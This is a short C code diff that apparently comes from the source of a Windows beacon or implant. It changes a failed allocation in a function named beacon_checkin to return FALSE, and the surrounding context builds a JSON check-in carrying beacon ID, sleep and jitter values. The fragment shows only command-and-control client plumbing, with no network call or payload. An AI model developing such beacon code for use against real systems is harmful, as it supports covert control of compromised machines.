@@ -28,7 +28,7 @@ BOOL beacon_checkin(BEACON_CTX *ctx) {
     /* dynamic JSON buffer sized to actual content */
     size_t json_sz = adapters_ln + 1024;
     char  *json    = (char *)HeapAlloc(GetProcessHeap(), 0, json_sz);
-    if (!json) return;
+    if (!json) return FALSE;
 
     snprintf(json, json_sz,
         "{\"beacon_id\":%lu,\"sleep_ms\":%lu,\"jitter_pct\":%lu,"
